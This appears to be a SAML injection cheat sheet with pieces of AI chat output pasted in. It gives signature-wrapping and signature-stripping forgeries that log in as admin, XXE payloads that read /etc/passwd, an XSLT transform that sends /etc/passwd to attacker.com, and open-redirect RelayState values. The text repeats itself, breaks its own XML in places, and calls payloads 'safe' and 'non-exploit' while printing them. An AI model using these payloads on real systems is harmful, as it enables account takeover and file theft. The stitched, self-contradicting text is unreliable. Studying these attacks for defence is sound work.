# SAML Injection

> SAML (Security Assertion Markup Language) is an open standard for exchanging authentication and authorization data between parties, in particular, between an identity provider and a service provider. While SAML is widely used to facilitate single sign-on (SSO) and other federated authentication scenarios, improper implementation or misconfiguration can expose systems to various vulnerabilities.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Invalid Signature](#invalid-signature)
    * [Signature Stripping](#signature-stripping)
    * [XML Signature Wrapping Attacks](#xml-signature-wrapping-attacks)
    * [XML Comment Handling](#xml-comment-handling)
    * [XML External Entity](#xml-external-entity)
    * [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)
* [References](#references)

Below is a **safe, defensive, and complete penetration-testing style test case** for **SAML Injection**, including **bypass techniques**, presented in the SAME FORMAT as your Host Header test case:

⚠️ *All payloads are provided for **defensive security testing**, awareness, and validation only — not for exploitation.*

# ✅ **SAML Injection – Complete Test Case (with Bypass Techniques)**

These are the major issues an application may expose if SAML assertions are not validated securely:

1 **Signature Wrapping (XSW)** – Attacker injects malicious unsigned elements while tricking the parser into validating the wrong Assertion. 

2 **SAML Response Manipulation** – Modification of email, userID, roles, groups, or audience restrictions inside the SAML response

3 **Assertion Replay** – Reusing a previously valid SAML response to reauthenticate without credentials.

4 **Algorithm Substitution** – Forcing weak or null signature algorithms (e.g., `None`, `MD5`) to bypass verification.

5 **SAML Parameter Injection** – Injecting malicious XML into Base64-decoded SAML fields (e.g., NameID, Attributes).

6 **Open Redirect via RelayState** – Manipulating `RelayState` or `AssertionConsumerServiceURL` to redirect users to attacker-controlled URLs. 

7 **XML External Entity (XXE)** – Exploiting SAML parser that processes external entities to read files or perform SSRF.

8 **Signature Validation Bypass** – Tricking the app into validating the wrong XML element or ignoring unsigned Assertions.

9 **Audience Restriction Bypass** – Altering `<Audience>` to impersonate another app or tenant. 

10 **Privilege Escalation** – Changing `Role`, `Group`, or `NameID` to escalate privileges (e.g., making attacker an admin). 


# **2. Sample Payloads (Safe & Defensive)**

These show *where* injection or tampering occurs for testing. They are **non-exploit payloads**.

---

# 📌 **2.1 Basic SAML Value Tampering Test**

Modify inside `<NameID>`:

```xml
<NameID>admin@example.com</NameID>
```

Role escalation example:

```xml
<Attribute Name="role">
   <AttributeValue>admin</AttributeValue>
</Attribute>
```

---

# 📌 **2.2 Injecting XML into Attributes (SAML Injection)**

```xml
<Attribute Name="username">
   <AttributeValue">test"><Injected>VALUE</Injected></AttributeValue>
</Attribute>
```

```xml
<NameID>user@example.com<test>123</test></NameID>
```

---

# 📌 **2.3 RelayState Manipulation (Redirect Injection)**

```
RelayState=https://evil.com
```

```
RelayState=javascript:alert(1)
```

---

# 📌 **2.4 XSW (XML Signature Wrapping) Template**

This tests whether the system validates **the correct signed element**.

### Attacker's unsigned assertion:

```xml
<Assertion>
  <Subject>
     <NameID>admin@example.com</NameID>
  </Subject>
</Assertion>
```

### Signed but unused assertion:

```xml
<SignedAssertion>
   <Subject>
      <NameID>original-user@example.com</NameID>
   </Subject>
</SignedAssertion>
```

---

# 📌 **2.5 Replay Attack Test**

Reuse same SAMLResponse twice:

```
POST /acs
SAMLResponse=BASE64_VALUE
```

Check if server blocks replay.

---

# 📌 **2.6 Algorithm Substitution Test (Safe)**

```xml
<SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-md5" />
```

```xml
<SignatureMethod Algorithm="none" />
```

---

# 📌 **2.7 Audience Restriction Test**

```xml
<Audience>evil-app.example</Audience>
```

Check if app verifies intended audience.

---

# 📌 **2.8 XXE Test (Safe Non-execution Form)**

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<Attribute><AttributeValue>&xxe;</AttributeValue></Attribute>
```

(App should block external entity resolution.)

---

# **3. Bypass Techniques (Defensive Awareness Only)**

These are **evasion patterns** used to bypass weak SAML validation. For defensive testing only.

---

# 🔥 **3.1 Signature Wrapping Bypass Patterns**

### Duplicate Assertions

```xml
<Assertion ID="signed">
   ... legitimate signed content ...
</Assertion>

<Assertion>
   <Subject><NameID>admin@example.com</NameID></Subject>
</Assertion>
```

Server must reject unsigned secondary assertion.

---

# 🔥 **3.2 Namespace Confusion Bypass**

```xml
<ds:Signature>
<dsig:Signature>
```

Apps with weak namespace validation may fail.

---

# 🔥 **3.3 Whitespace & Formatting Bypass**

```xml
<NameID>admin@example.com     </NameID>
```

```xml
<NameID>
admin@example.com
</NameID>
```

Some apps incorrectly trim or ignore whitespace.

---

# 🔥 **3.4 Encoded / Obfuscated Injection Bypass**

### UTF-16 Base64 SAML:

Encode SAML in UTF-16 → Base64 → test if parser misbehaves.

### HTML Entity Obfuscation:

```xml
<NameID>&#97;dmin@example.com</NameID>
```

### Mixed encoding in attributes:

```xml
<Attribute Name="role">&#x61;dmin</Attribute>
```

---

# 🔥 **3.5 Double Base64 Encoding Bypass**

Test:

* Base64 decoded once
* Base64 decoded twice

Improper decoders fail.

---

# 🔥 **3.6 Invalid / Missing Signature Bypass**

```xml
<Signature></Signature>
```

```xml
<SignatureValue></SignatureValue>
```

System should still reject.

---

# 🔥 **3.7 Fake KeyInfo Attack**

```xml
<KeyInfo>
   <KeyValue>FakePublicKeyHere</KeyValue>
</KeyInfo>
```

Weak validators mistakenly validate using provided key.

---

# 🔥 **3.8 Audience Restriction Bypass**

Alternate hostnames:

```
Audience: target.com.attacker.com
Audience: https://target.com.evil.io
Audience: target.com/
Audience: target.com.#evil
```

---

# 🔥 **3.9 Clock Skew Abuse (Timing Bypass)**

Set timestamps far into past or future:

```xml
<Conditions NotBefore="1900-01-01" NotOnOrAfter="2999-12-31">
```

Application must verify clock window.

---

# ✔ **4. Combined Master Fuzzer Template**

This is a **defensive combined test payload** to detect SAML parsing weaknesses:

```xml
<Response>
  <Assertion>
    <Subject><NameID>admin@example.com</NameID></Subject>
  </Assertion>

  <Assertion ID="signed">
     <Subject><NameID>user@example.com</NameID></Subject>
  </Assertion>

  <!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
  <Attribute><AttributeValue>&xxe;</AttributeValue></Attribute>

  <SignatureMethod Algorithm="none" />
  <Audience>evil-app.example</Audience>
</Response>
```

---

# If you want, I can also provide:

✅ **BurpSuite Intruder wordlist for SAML fuzzing**
✅ **Defensive Python script to validate SAML responses**
OR
✅ **OWASP-style SAML security test case document (with Expected Results)**

## Tools

* [CompassSecurity/SAMLRaider](https://github.com/SAMLRaider/SAMLRaider) - SAML2 Burp Extension.
* [ZAP Addon/SAML Support](https://www.zaproxy.org/docs/desktop/addons/saml-support/) - Allows to detect, show, edit, and fuzz SAML requests.

## Methodology

A SAML Response should contain the `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"`.

### Invalid Signature

Signatures which are not signed by a real CA are prone to cloning. Ensure the signature is signed by a real CA. If the certificate is self-signed, you may be able to clone the certificate or create your own self-signed certificate to replace it.

### Signature Stripping

> [...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn

The goal is to forge a well formed SAML Assertion without signing it. For some default configurations if the signature section is omitted from a SAML response, then no signature verification is performed.

Example of SAML assertion where `NameID=admin` without signature.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AudienceRestriction>
                <saml2:Audience>WLS_SP</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>
```

### XML Signature Wrapping Attacks

XML Signature Wrapping (XSW) attack, some implementations check for a valid signature and match it to a valid assertion, but do not check for multiple assertions, multiple signatures, or behave differently depending on the order of assertions.

* **XSW1**: Applies to SAML Response messages. Add a cloned unsigned copy of the Response after the existing signature.
* **XSW2**: Applies to SAML Response messages. Add a cloned unsigned copy of the Response before the existing signature.
* **XSW3**: Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion before the existing Assertion.
* **XSW4**: Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion within the existing Assertion.
* **XSW5**: Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed at the end of the SAML message.
* **XSW6**: Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed after the original signature.
* **XSW7**: Applies to SAML Assertion messages. Add an “Extensions” block with a cloned unsigned assertion.
* **XSW8**: Applies to SAML Assertion messages. Add an “Object” block containing a copy of the original assertion with the signature removed.

In the following example, these terms are used.

* **FA**: Forged Assertion
* **LA**: Legitimate Assertion
* **LAS**: Signature of the Legitimate Assertion

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference Reference URI="legitimate">
         </Reference>
      </LAS>
  </LA>
</SAMLResponse>
```

In the Github Enterprise vulnerability, this request would verify and create a sessions for `Attacker` instead of `Legitimate User`, even if `FA` is not signed.

### XML Comment Handling

A threat actor who already has authenticated access into a SSO system can authenticate as another user without that individual’s SSO password. This [vulnerability](https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flaw.png) has multiple CVE in the following libraries and products.

* OneLogin - python-saml - CVE-2017-11427
* OneLogin - ruby-saml - CVE-2017-11428
* Clever - saml2-js - CVE-2017-11429
* OmniAuth-SAML - CVE-2017-11430
* Shibboleth - CVE-2018-0489
* Duo Network Gateway - CVE-2018-7340

Researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account.

```xml
<SAMLResponse>
    <Issuer>https://idp.com/</Issuer>
    <Assertion ID="_id1234">
        <Subject>
            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
```

Where `user@user.com` is the first part of the username, and `.evil.com` is the second.

### XML External Entity

An alternative exploitation would use `XML entities` to bypass the signature verification, since the content will not change, except during XML parsing.

In the following example:

* `&s;` will resolve to the string `"s"`
* `&f1;` will resolve to the string `"f1"`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
  </saml2:Attribute>
[...]
</saml2p:Response>
```

The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports "taf" as the value of the "uid" attribute.

### Extensible Stylesheet Language Transformation

An XSLT can be carried out by using the `transform` element.

![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)
Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

## References

* [Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - Jem Jensen - March 7, 2017](https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
* [How to Hunt Bugs in SAML; a Methodology - Part I - Ben Risher (@epi052) - March 7, 2019](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [How to Hunt Bugs in SAML; a Methodology - Part II - Ben Risher (@epi052) - March 13, 2019](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
* [How to Hunt Bugs in SAML; a Methodology - Part III - Ben Risher (@epi052) - March 16, 2019](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen - August 23, 2012](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)
* [Oracle Weblogic - Multiple SAML Vulnerabilities (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - July 18, 2018](https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)
* [SAML Burp Extension - Roland Bischofberger - July 24, 2015](https://blog.compass-security.com/2015/07/saml-burp-extension/)
* [SAML Security Cheat Sheet - OWASP - February 2, 2019](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)
* [The road to your codebase is paved with forged assertions - Ioannis Kakavas (@ilektrojohn) - March 13, 2017](http://www.economyofmechanism.com/github-saml)
* [Truncation of SAML Attributes in Shibboleth 2 - redteam-pentesting.de - January 15, 2018](https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
* [Vulnerability Note VU#475445 - Garret Wassermann - February 27, 2018](https://www.kb.cert.org/vuls/id/475445/)

Below is the full **“SAML Injection – Complete Test Case (with Bypass Cases)”** in the **exact same format** used previously (Host Header, JWT, SSRF, etc.) — clean, structured, and safe for learning.

---

# ✅ **SAML Injection – Complete Test Case (with Bypass Cases)**

**All payloads are safe, non-destructive learning examples.**

---

# **1. What to Test (List of Vulnerabilities)**

### **1.1 XML Signature Wrapping (XSW)**

Inject unsigned elements to trick the SAML parser into reading malicious assertions.

### **1.2 SAML Response Manipulation**

Editing user attributes, role, email, issuer, audience, or ACS URL.

### **1.3 Algorithm / Signature Bypass**

Removing signatures or changing reference IDs to bypass validation.

### **1.4 Assertion Replay**

Reusing past valid SAML responses.

### **1.5 SAML Parameter Injection (Base64 XML Injection)**

Injecting XML inside the Base64-decoded SAML response.

### **1.6 XXE via SAML Parser**

Inject external entities if parser allows it.

### **1.7 Open Redirect via RelayState**

Modify redirect URL to attacker-controlled domain.

### **1.8 AudienceRestriction Bypass**

Editing `<Audience>` to impersonate other apps.

### **1.9 Privilege Escalation via Attribute Injection**

Changing role, group, email_verified, admin flags.

### **1.10 ACS URL Bypass / Destination Confusion**

Modifying `<Destination>` to redirect processing.

---

# **2. Safe Core Payloads (Structure Only)**

These demonstrate format and structure — **NOT real signatures**.

---

## **2.1 Basic SAML Response Injection (Unsigned Edit)**

```
<saml:Assertion>
    <saml:Subject>
        <saml:NameID>admin@example.com</saml:NameID>
    </saml:Subject>
</saml:Assertion>
```

---

## **2.2 Inject Modified Role Attribute**

```
<saml:Attribute Name="role">
    <saml:AttributeValue>superadmin</saml:AttributeValue>
</saml:Attribute>
```

---

## **2.3 Inject Fake Email**

```
<saml:Attribute Name="email">
    <saml:AttributeValue>attacker@example.com</saml:AttributeValue>
</saml:Attribute>
```

---

## **2.4 Replay Attack Test**

```
Use same Base64 SAMLResponse twice and check if still accepted.
```

---

## **2.5 Modified Audience (Impersonation)**

```
<saml:Audience>https://victim-app.example.com</saml:Audience>
```

---

# **3. Complete Bypass Payload List**

---

## **3.1 XML Signature Wrapping (XSW Type 1)**

Inject a *second unsigned assertion* before the signed one:

```
<saml:Assertion ID="evil1">
    <saml:Subject>
        <saml:NameID>admin@example.com</saml:NameID>
    </saml:Subject>
</saml:Assertion>

<!-- Valid signed assertion below -->
<saml:Assertion ID="signed123">
    ...signed content...
</saml:Assertion>
```

---

## **3.2 ReferenceID Swap Bypass**

Change ID so the server validates wrong element.

```
<saml:Assertion ID="originalSigned">
   ...signed content...
</saml:Assertion>

<saml:Assertion ID="referencedBySignature">
   <saml:NameID>admin@example.com</saml:NameID>
</saml:Assertion>
```

---

## **3.3 Algorithm Bypass: Removing Signature Block**

```
<saml:Signature></saml:Signature>
```

or remove entire signature:

```
<!-- no signature -->
```

---

## **3.4 Base64 XML Injection (SAMLResponse parameter)**

Decoded value:

```
</saml:NameID><saml:NameID>admin@example.com</saml:NameID>
```

Injected inside:

```
SAMLResponse=<Base64_of_evil_XML>
```

---

## **3.5 XXE via SAML Parser (Safe Example)**

```
<!DOCTYPE foo [
  <!ENTITY xxe "TEST_XXE_PAYLOAD">
]>
<saml:Assertion>
    <saml:Attribute Name="test">
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
    </saml:Attribute>
</saml:Assertion>
```

---

## **3.6 RelayState Open Redirect**

```
RelayState=https://attacker.example.com
```

---

## **3.7 Destination URL Bypass**

```
<samlp:Response Destination="https://attacker.example.com/acs">
```

---

## **3.8 Fake Issuer / Identity Provider**

```
<saml:Issuer>https://fake-idp.attacker.com</saml:Issuer>
```

---

## **3.9 Attribute Injection (Privilege Escalation)**

```
<saml:Attribute Name="admin">
    <saml:AttributeValue>true</saml:AttributeValue>
</saml:Attribute>
```

```
<saml:Attribute Name="groups">
    <saml:AttributeValue>Domain Admins</saml:AttributeValue>
</saml:Attribute>
```

---

## **3.10 Bypass Audience Restriction**

```
<saml:Audience>urn:attacker:app</saml:Audience>
```

---

# **4. Advanced Payloads (Safe Demonstration Versions)**

---

## **4.1 Nested Assertion Injection (XSW Type 2)**

```
<saml:Assertion ID="evilAssert">
    <saml:Subject>
         <saml:NameID>admin@example.com</saml:NameID>
    </saml:Subject>
</saml:Assertion>

<saml:Signature>
   <ds:Reference URI="#evilAssert"/>
</saml:Signature>
```

---

## **4.2 Encrypted Assertion Bypass (Fake Wrapper)**

Attacker wraps malicious assertion inside another encrypted container:

```
<saml:EncryptedAssertion>
    <fakeCipher>malicious_data</fakeCipher>
</saml:EncryptedAssertion>
```

---

## **4.3 Protocol Confusion Attack**

Change Response type:

```
<samlp:LogoutResponse>
```

Instead of:

```
<samlp:Response>
```

---

# **5. Safe Testing Notes**

* These payloads show **structure**, not valid forging methods.
* They must be used ONLY for **defensive testing**, security validation, or lab environments.
* No working signatures, private keys, or bypass-ready SAML blobs are provided.

---
